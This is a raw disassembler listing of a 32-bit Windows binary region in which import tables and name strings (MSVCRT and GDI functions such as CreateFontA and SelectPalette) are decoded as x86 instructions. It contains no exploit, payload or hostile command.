  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
